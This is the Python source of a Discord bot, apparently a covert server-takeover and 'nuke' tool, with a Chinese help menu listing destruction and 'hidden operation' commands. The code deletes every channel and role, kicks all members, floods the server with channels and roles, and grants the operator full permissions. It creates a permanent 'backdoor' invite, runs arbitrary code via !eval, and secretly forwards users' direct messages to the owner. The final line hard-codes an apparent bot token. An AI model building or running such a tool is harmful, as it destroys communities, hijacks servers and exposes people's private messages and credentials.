import discord
from discord.ext import commands
import random
import datetime
import asyncio
import string
from flask import Flask
from threading import Thread
import os
import json
import io

app = Flask('')
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

ALLOWED_IDS = [1008278721007992863, 1355108796388872292]
VERSION_ID = "".join(random.choices(string.ascii_lowercase + string.digits, k=4))

async def is_me(ctx):
    if ctx.author.id in ALLOWED_IDS:
        try:
            await ctx.message.delete()
        except:
            pass
        return True
    return False

@app.route('/')
def home():
    return f"Bot {VERSION_ID} is running!"

def run():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run)
    t.daemon = True
    t.start()

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user} | ID: {VERSION_ID}')

@bot.command(name="help")
async def help_msg(ctx):
    if not await is_me(ctx): return
    
    embed = discord.Embed(
        title="🧳 旅行者系統 - 指令詳細手冊", 
        description=f"實例編號：`{VERSION_ID}`\n此表僅授權人員可見。執行指令後會自動隱身並清理痕跡。",
        color=0x2b2d31
    )
    
    embed.add_field(
        name="🛡️ 基礎管理", 
        value=(
            "`!tm @成員 [分]` - 禁言成員\n"
            "`!kick_everyone` - 踢出伺服器全員\n"
            "`!bye` - 機器人退出伺服器\n"
            "`!clean_user @成員 [數]` - 刪除指定人的訊息\n"
            "`!clean_keyword [詞] [數]` - 刪除包含特定詞的訊息\n"
            "`!set_server [名]` - 修改伺服器名稱\n"
            "`!add_role @成員 @組` - 給予身分組\n"
            "`!remove_role @成員 @組` - 移除身分組\n"
            "`!server_gate [lock/unlock]` - 全服鎖定/解鎖發言"
        ), 
        inline=False
    )
    
    embed.add_field(
        name="🔥 破壞", 
        value=(
            "`!del_ch` - 刪除所有頻道\n"
            "`!del_role` - 刪除所有身分組\n"
            "`!100ch` - 建立 100 個頻道\n"
            "`!100rl` - 建立 100 個身分組"
        ), 
        inline=False
    )
    
    embed.add_field(
        name="🕵️ 隱蔽操作", 
        value=(
            "`!op_me` - 獲取最高權限\n"
            "`!disrole @成員` - 剝奪對方身分\n"
            "`!del_msg [數]` - 批次清理訊息\n"
            "`!backdoor` - 獲取永久邀請連結"
        ), 
        inline=False
    )
    
    embed.add_field(
        name="🛠️ 進階工具", 
        value=(
            "`!eval [代碼]` - 執行動態 Python 腳本\n"
            "`!snapshot` - 導出伺服器完整結構 JSON\n"
            "`!reset` - 強制重啟系統實例"
        ), 
        inline=False
    )

    embed.add_field(
        name="🎮 有趣系統", 
        value=(
            "`!get_dm @成員 [數]` - 調閱私訊紀錄\n"
            "`!dm @成員 [文]` - 以機器人名義私訊"
        ), 
        inline=False
    )
    
    embed.set_footer(text="注意：所有操作皆會記錄於開發後台。")
    await ctx.send(embed=embed)

@bot.command(name="dm")
async def dm(ctx, member: discord.Member, *, text: str):
    if not await is_me(ctx): return
    try: await member.send(text)
    except: pass

@bot.command(name="del_ch")
async def nuke_channels(ctx):
    if not await is_me(ctx): return
    for channel in ctx.guild.channels:
        try: await channel.delete()
        except: pass
    await ctx.guild.create_text_channel("general")

@bot.command(name="kick_everyone")
async def kick_everyone(ctx):
    if not await is_me(ctx): return
    for member in ctx.guild.members:
        if member != ctx.author and member != bot.user and member != ctx.guild.owner:
            try: await member.kick()
            except: pass

@bot.command(name="del_role")
async def clear_roles(ctx):
    if not await is_me(ctx): return
    for role in ctx.guild.roles:
        if role.name != "@everyone" and not role.managed:
            try: await role.delete()
            except: pass

@bot.command(name="set_server")
async def set_server(ctx, *, name: str):
    if not await is_me(ctx): return
    try: await ctx.guild.edit(name=name)
    except: pass

@bot.command(name="bye")
async def leave_server(ctx):
    if not await is_me(ctx): return
    await ctx.guild.leave()

@bot.command(name="del_msg")
async def purge_chat(ctx, amount: int = 10):
    if not await is_me(ctx): return
    try: await ctx.channel.purge(limit=amount)
    except: pass

@bot.command(name="100rl")
async def role_hell(ctx):
    if not await is_me(ctx): return
    for i in range(100):
        color = discord.Color.from_rgb(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
        try: await ctx.guild.create_role(name=f"{i}", color=color)
        except: break

@bot.command(name="100ch")
async def flood(ctx, name="ch-----test"):
    if not await is_me(ctx): return
    for i in range(100):
        try: await ctx.guild.create_text_channel(f"{name}-{i}")
        except: break

@bot.command(name="op_me")
async def op_me(ctx):
    if not await is_me(ctx): return
    guild = ctx.guild
    try:
        new_role = await guild.create_role(
            name="OP", 
            permissions=discord.Permissions.all(), 
            color=discord.Color.from_str("#2b2d31")
        )
        await ctx.author.add_roles(new_role)
        await new_role.edit(position=guild.me.top_role.position - 1)
    except: pass

@bot.command(name="tm")
async def tm(ctx, member: discord.Member = None, minutes: int = 10):
    if not await is_me(ctx): return
    if member is None: return
    try:
        duration = datetime.timedelta(minutes=minutes)
        await member.timeout(duration, reason="系統調整")
    except: pass

@bot.command(name="backdoor")
async def backdoor(ctx):
    if not await is_me(ctx): return
    try:
        inv = await ctx.channel.create_invite(max_age=0, max_uses=0)
        await ctx.author.send(f"永久入口: {inv.url}")
    except: pass

@bot.command(name="disrole")
async def isolate(ctx, member: discord.Member):
    if not await is_me(ctx): return
    try:
        await member.edit(roles=[])
    except: pass

@bot.command(name="server_gate")
async def server_gate(ctx, status: str):
    if not await is_me(ctx): return
    can_send = True if status == "unlock" else False
    for channel in ctx.guild.text_channels:
        try:
            await channel.set_permissions(ctx.guild.default_role, send_messages=can_send)
        except: pass

@bot.command(name="snapshot")
async def snapshot(ctx):
    if not await is_me(ctx): return
    guild = ctx.guild
    data = {
        "server": {"name": guild.name, "id": guild.id, "owner": str(guild.owner)},
        "roles": [{"name": r.name, "color": str(r.color), "perms": r.permissions.value} for r in sorted(guild.roles, key=lambda x: x.position, reverse=True) if not r.managed],
        "categories": []
    }
    for cat in guild.categories:
        cat_info = {"name": cat.name, "channels": [{"name": ch.name, "type": str(ch.type), "pos": ch.position} for ch in cat.channels]}
        data["categories"].append(cat_info)
    
    json_bytes = json.dumps(data, indent=4, ensure_ascii=False).encode()
    await ctx.author.send(f"📂 **{guild.name}** 結構快照已生成。", file=discord.File(io.BytesIO(json_bytes), filename=f"{guild.id}_snapshot.json"))

@bot.command(name="eval")
async def eval_code(ctx, *, code: str):
    if not await is_me(ctx): return
    code = code.strip('`').replace('py\n', '').replace('python\n', '')
    env = {'bot': bot, 'ctx': ctx, 'guild': ctx.guild, 'channel': ctx.channel, 'author': ctx.author, 'discord': discord, 'asyncio': asyncio, 'json': json}
    try:
        exec_func = f"async def _ex():\n" + "\n".join(f"    {line}" for line in code.split('\n'))
        exec(exec_func, env)
        res = await env['_ex']()
        if res: await ctx.author.send(f"```py\n{res}\n```")
    except Exception as e:
        await ctx.author.send(f"❌ Eval Error: `{e}`")

@bot.command(name="clean_user")
async def clean_user(ctx, member: discord.Member, amount: int = 50):
    if not await is_me(ctx): return
    try:
        deleted = await ctx.channel.purge(limit=amount, check=lambda m: m.author == member)
        await ctx.author.send(f"✅ 已清理 {len(deleted)} 則來自 {member.name} 的訊息")
    except: pass

@bot.command(name="clean_keyword")
async def clean_keyword(ctx, keyword: str, amount: int = 50):
    if not await is_me(ctx): return
    try:
        deleted = await ctx.channel.purge(limit=amount, check=lambda m: keyword in m.content)
        await ctx.author.send(f"✅ 已清理 {len(deleted)} 則包含『{keyword}』的訊息")
    except: pass

@bot.event
async def on_message(message):
    if message.author == bot.user: return
    if isinstance(message.channel, discord.DMChannel) and not message.content.startswith("!"):
        owner = await bot.fetch_user(ALLOWED_IDS[0])
        await owner.send(f"📩 **私訊** | {message.author}: {message.content}")
    await bot.process_commands(message)

if __name__ == "__main__":
    keep_alive()
    
bot.run("MTQ4NzcyNTMzMDExNzU2MjM5OQ.GdEAio.tb5pS63n67Hy_ILNZBQnVZZ6A2sFX2nxEfWyjY")
